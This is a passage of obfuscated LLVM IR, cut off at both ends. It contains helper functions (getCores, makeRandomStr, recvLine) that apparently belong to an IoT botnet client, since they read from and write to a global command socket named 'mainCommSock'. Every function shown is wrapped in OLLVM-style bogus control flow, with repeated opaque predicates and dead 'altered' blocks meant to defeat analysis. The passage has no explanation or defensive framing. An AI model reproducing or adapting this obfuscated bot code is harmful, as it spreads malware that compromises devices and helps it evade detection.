  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:85:                                     ; preds = %originalBBpart28, %59, %54
  %86 = phi i1 [ true, %59 ], [ true, %54 ], [ %76, %originalBBpart28 ]
  %87 = load i32, i32* @x.37
  %88 = load i32, i32* @y.38
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %85
  %95 = load i32, i32* @x.37
  %96 = load i32, i32* @y.38
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %86, label %103, label %106

; <label>:103:                                    ; preds = %originalBBpart212
  %104 = load i8*, i8** %6, align 8
  %105 = getelementptr inbounds i8, i8* %104, i32 1
  store i8* %105, i8** %6, align 8
  br label %54

; <label>:106:                                    ; preds = %originalBBpart212
  %107 = load i32, i32* @x.37
  %108 = load i32, i32* @y.38
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  %115 = load i32, i32* @x.37
  %116 = load i32, i32* @y.38
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %123

; <label>:123:                                    ; preds = %originalBBpart225, %originalBBpart216
  %124 = load i8*, i8** %6, align 8
  %125 = load i8*, i8** %6, align 8
  %126 = call i64 @strlen(i8* %125) #10
  %127 = sub i64 %126, 1
  %128 = getelementptr inbounds i8, i8* %124, i64 %127
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 13
  br i1 %131, label %141, label %132

; <label>:132:                                    ; preds = %123
  %133 = load i8*, i8** %6, align 8
  %134 = load i8*, i8** %6, align 8
  %135 = call i64 @strlen(i8* %134) #10
  %136 = sub i64 %135, 1
  %137 = getelementptr inbounds i8, i8* %133, i64 %136
  %138 = load i8, i8* %137, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 10
  br label %141

; <label>:141:                                    ; preds = %132, %123
  %142 = phi i1 [ true, %123 ], [ %140, %132 ]
  %143 = load i32, i32* @x.37
  %144 = load i32, i32* @y.38
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %141
  %151 = load i32, i32* @x.37
  %152 = load i32, i32* @y.38
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %142, label %159, label %181

; <label>:159:                                    ; preds = %originalBBpart220
  %160 = load i32, i32* @x.37
  %161 = load i32, i32* @y.38
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %159
  %168 = load i8*, i8** %6, align 8
  %169 = load i8*, i8** %6, align 8
  %170 = call i64 @strlen(i8* %169) #10
  %171 = sub i64 %170, 1
  %172 = getelementptr inbounds i8, i8* %168, i64 %171
  store i8 0, i8* %172, align 1
  %173 = load i32, i32* @x.37
  %174 = load i32, i32* @y.38
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart225, label %originalBB22alteredBB

originalBBpart225:                                ; preds = %originalBB22
  br label %123

; <label>:181:                                    ; preds = %originalBBpart220
  %182 = load i8*, i8** %6, align 8
  %183 = call i8* @strchr(i8* %182, i32 46) #10
  %184 = icmp ne i8* %183, null
  br i1 %184, label %185, label %188

; <label>:185:                                    ; preds = %181
  %186 = load i8*, i8** %6, align 8
  %187 = call i8* @strchr(i8* %186, i32 46) #10
  store i8 0, i8* %187, align 1
  br label %188

; <label>:188:                                    ; preds = %185, %181
  %189 = load i8*, i8** %3, align 8
  %190 = load i8*, i8** %6, align 8
  %191 = call i8* @strcpy(i8* %189, i8* %190) #5
  %192 = load i32, i32* %4, align 4
  %193 = call i32 @close(i32 %192)
  store i32 0, i32* %2, align 4
  br label %215

; <label>:194:                                    ; preds = %originalBBpart2
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %195, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:196:                                    ; preds = %8
  %197 = load i32, i32* @x.37
  %198 = load i32, i32* @y.38
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %196
  %205 = load i32, i32* %4, align 4
  %206 = call i32 @close(i32 %205)
  store i32 1, i32* %2, align 4
  %207 = load i32, i32* @x.37
  %208 = load i32, i32* @y.38
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %215

; <label>:215:                                    ; preds = %originalBBpart229, %188
  %216 = load i32, i32* %2, align 4
  ret i32 %216

originalBBalteredBB:                              ; preds = %originalBB, %13
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %217)
  %218 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %219 = call i8* @strstr(i8* %218, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0)) #10
  %220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %221 = icmp eq i8* %219, %220
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %222 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %223 = getelementptr inbounds i8, i8* %222, i64 8
  store i8* %223, i8** %6, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %64
  %224 = load i8*, i8** %6, align 8
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 58
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %85
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %141
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %159
  %228 = load i8*, i8** %6, align 8
  %229 = load i8*, i8** %6, align 8
  %230 = call i64 @strlen(i8* %229) #10
  %_ = shl i64 %230, 1
  %_23 = shl i64 %230, 1
  %231 = sub i64 %230, 1
  %232 = getelementptr inbounds i8, i8* %228, i64 %231
  store i8 0, i8* %232, align 1
  br label %originalBB22

originalBB27alteredBB:                            ; preds = %originalBB27, %196
  %233 = load i32, i32* %4, align 4
  %234 = call i32 @close(i32 %233)
  store i32 1, i32* %2, align 4
  br label %originalBB27
}

declare i32 @open(i8*, i32, ...) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.38, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = load i32, i32* @x.41
  %4 = load i32, i32* @y.42
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %13, align 4
  %14 = load i32, i32* @x.41
  %15 = load i32, i32* @y.42
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %originalBBpart29, %originalBBpart2
  %23 = load i32, i32* %13, align 4
  %24 = load i32, i32* %12, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %54

; <label>:26:                                     ; preds = %22
  %27 = call i32 @rand_cmwc()
  %28 = urem i32 %27, 26
  %29 = add i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %11, align 8
  %32 = load i32, i32* %13, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* @x.41
  %37 = load i32, i32* @y.42
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = load i32, i32* %13, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %13, align 4
  %46 = load i32, i32* @x.41
  %47 = load i32, i32* @y.42
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br label %22

; <label>:54:                                     ; preds = %22
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %55 = alloca i8*, align 8
  %56 = alloca i32, align 4
  %57 = alloca i32, align 4
  store i8* %0, i8** %55, align 8
  store i32 %1, i32* %56, align 4
  store i32 0, i32* %57, align 4
  store i32 0, i32* %57, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %58 = load i32, i32* %13, align 4
  %_ = sub i32 %58, 1
  %gen = mul i32 %_, 1
  %_2 = sub i32 %58, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 %58, 1
  %gen5 = mul i32 %_4, 1
  %_6 = sub i32 0, %58
  %gen7 = add i32 %_6, 1
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* @x.43
  %35 = load i32, i32* @y.44
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %5, align 4
  %43 = srem i32 %42, 64
  %44 = zext i32 %43 to i64
  %45 = shl i64 1, %44
  %46 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %47 = load i32, i32* %5, align 4
  %48 = sdiv i32 %47, 64
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [16 x i64], [16 x i64]* %46, i64 0, i64 %49
  %51 = load i64, i64* %50, align 8
  %52 = or i64 %51, %45
  store i64 %52, i64* %50, align 8
  %53 = load i32, i32* %5, align 4
  %54 = add nsw i32 %53, 1
  %55 = call i32 @select(i32 %54, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %55, i32* %12, align 4
  %56 = icmp sle i32 %55, 0
  %57 = load i32, i32* @x.43
  %58 = load i32, i32* @y.44
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %152

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.43
  %67 = load i32, i32* @y.44
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %65
  %74 = load i32, i32* @x.43
  %75 = load i32, i32* @y.44
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %82

; <label>:82:                                     ; preds = %147, %originalBBpart251
  %83 = load i32, i32* %13, align 4
  %84 = icmp slt i32 %83, 10
  br i1 %84, label %85, label %151

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* @x.43
  %87 = load i32, i32* @y.44
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %85
  %94 = load i32, i32* @mainCommSock, align 4
  %95 = call i32 (i32, i8*, ...) @sockprintf(i32 %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0))
  %96 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %96, align 8
  %97 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %97, align 8
  %98 = load i32, i32* @x.43
  %99 = load i32, i32* @y.44
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %106

; <label>:106:                                    ; preds = %originalBBpart255
  %107 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %108 = getelementptr inbounds [16 x i64], [16 x i64]* %107, i64 0, i64 0
  %109 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %108) #5, !srcloc !2
  %110 = extractvalue { i64, i64* } %109, 0
  %111 = extractvalue { i64, i64* } %109, 1
  %112 = trunc i64 %110 to i32
  store i32 %112, i32* %14, align 4
  %113 = ptrtoint i64* %111 to i64
  %114 = trunc i64 %113 to i32
  store i32 %114, i32* %15, align 4
  br label %115

; <label>:115:                                    ; preds = %106
  %116 = load i32, i32* @x.43
  %117 = load i32, i32* @y.44
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %115
  %124 = load i32, i32* %5, align 4
  %125 = srem i32 %124, 64
  %126 = zext i32 %125 to i64
  %127 = shl i64 1, %126
  %128 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %129 = load i32, i32* %5, align 4
  %130 = sdiv i32 %129, 64
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [16 x i64], [16 x i64]* %128, i64 0, i64 %131
  %133 = load i64, i64* %132, align 8
  %134 = or i64 %133, %127
  store i64 %134, i64* %132, align 8
  %135 = load i32, i32* %5, align 4
  %136 = add nsw i32 %135, 1
  %137 = call i32 @select(i32 %136, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %137, i32* %12, align 4
  %138 = icmp sle i32 %137, 0
  %139 = load i32, i32* @x.43
  %140 = load i32, i32* @y.44
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart283, label %originalBB57alteredBB

originalBBpart283:                                ; preds = %originalBB57
  br i1 %138, label %147, label %150

; <label>:147:                                    ; preds = %originalBBpart283
  %148 = load i32, i32* %13, align 4
  %149 = add nsw i32 %148, 1
  store i32 %149, i32* %13, align 4
  br label %82

; <label>:150:                                    ; preds = %originalBBpart283
  br label %151

; <label>:151:                                    ; preds = %150, %82
  br label %152

; <label>:152:                                    ; preds = %151, %originalBBpart2
  %153 = load i32, i32* @x.43
  %154 = load i32, i32* @y.44
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %152
  store i32 0, i32* %18, align 4
  %161 = load i8*, i8** %6, align 8
  store i8* %161, i8** %17, align 8
  %162 = load i32, i32* @x.43
  %163 = load i32, i32* @y.44
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %170

; <label>:170:                                    ; preds = %originalBBpart2117, %originalBBpart287
  %171 = load i32, i32* @x.43
  %172 = load i32, i32* @y.44
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %170
  %179 = load i32, i32* %7, align 4
  %180 = add nsw i32 %179, -1
  store i32 %180, i32* %7, align 4
  %181 = icmp sgt i32 %179, 1
  %182 = load i32, i32* @x.43
  %183 = load i32, i32* @y.44
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart293, label %originalBB89alteredBB

originalBBpart293:                                ; preds = %originalBB89
  br i1 %181, label %190, label %255

; <label>:190:                                    ; preds = %originalBBpart293
  %191 = load i32, i32* @x.43
  %192 = load i32, i32* @y.44
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %190
  %199 = load i32, i32* @mainCommSock, align 4
  %200 = call i64 @recv(i32 %199, i8* %16, i64 1, i32 0)
  %201 = icmp ne i64 %200, 1
  %202 = load i32, i32* @x.43
  %203 = load i32, i32* @y.44
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br i1 %201, label %210, label %228

; <label>:210:                                    ; preds = %originalBBpart297
  %211 = load i32, i32* @x.43
  %212 = load i32, i32* @y.44
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %210
  %219 = load i8*, i8** %17, align 8
  store i8 0, i8* %219, align 1
  store i32 -1, i32* %4, align 4
  %220 = load i32, i32* @x.43
  %221 = load i32, i32* @y.44
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %258

; <label>:228:                                    ; preds = %originalBBpart297
  %229 = load i8, i8* %16, align 1
  %230 = load i8*, i8** %17, align 8
  %231 = getelementptr inbounds i8, i8* %230, i32 1
  store i8* %231, i8** %17, align 8
  store i8 %229, i8* %230, align 1
  %232 = load i8, i8* %16, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 10
  br i1 %234, label %235, label %236

; <label>:235:                                    ; preds = %228
  br label %255

; <label>:236:                                    ; preds = %228
  %237 = load i32, i32* @x.43
  %238 = load i32, i32* @y.44
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %236
  %245 = load i32, i32* %18, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %18, align 4
  %247 = load i32, i32* @x.43
  %248 = load i32, i32* @y.44
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart2117, label %originalBB103alteredBB

originalBBpart2117:                               ; preds = %originalBB103
  br label %170

; <label>:255:                                    ; preds = %235, %originalBBpart293
  %256 = load i8*, i8** %17, align 8
  store i8 0, i8* %256, align 1
  %257 = load i32, i32* %18, align 4
  store i32 %257, i32* %4, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %originalBBpart2101
  %259 = load i32, i32* %4, align 4
  ret i32 %259

originalBBalteredBB:                              ; preds = %originalBB, %33
  %260 = load i32, i32* %5, align 4
  %_ = sub i32 %260, 64
  %gen = mul i32 %_, 64
  %_1 = shl i32 %260, 64
  %_2 = shl i32 %260, 64
  %_3 = shl i32 %260, 64
  %_4 = sub i32 0, %260
  %gen5 = add i32 %_4, 64
  %_6 = sub i32 0, %260
  %gen7 = add i32 %_6, 64
  %_8 = shl i32 %260, 64
  %261 = srem i32 %260, 64
  %262 = zext i32 %261 to i64
  %_9 = sub i64 0, 1
  %gen10 = add i64 %_9, %262
  %_11 = sub i64 1, %262
  %gen12 = mul i64 %_11, %262
  %_13 = shl i64 1, %262
  %_14 = sub i64 1, %262
  %gen15 = mul i64 %_14, %262
  %_16 = sub i64 1, %262
  %gen17 = mul i64 %_16, %262
  %_18 = shl i64 1, %262
  %263 = shl i64 1, %262
  %264 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %265 = load i32, i32* %5, align 4
  %_19 = sub i32 %265, 64
  %gen20 = mul i32 %_19, 64
  %_21 = sub i32 0, %265
  %gen22 = add i32 %_21, 64
  %_23 = sub i32 %265, 64
  %gen24 = mul i32 %_23, 64
  %_25 = shl i32 %265, 64
  %_26 = sub i32 0, %265
  %gen27 = add i32 %_26, 64
  %_28 = sub i32 %265, 64
  %gen29 = mul i32 %_28, 64
  %266 = sdiv i32 %265, 64
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds [16 x i64], [16 x i64]* %264, i64 0, i64 %267
  %269 = load i64, i64* %268, align 8
  %_30 = sub i64 0, %269
  %gen31 = add i64 %_30, %263
  %_32 = shl i64 %269, %263
  %_33 = sub i64 %269, %263
  %gen34 = mul i64 %_33, %263
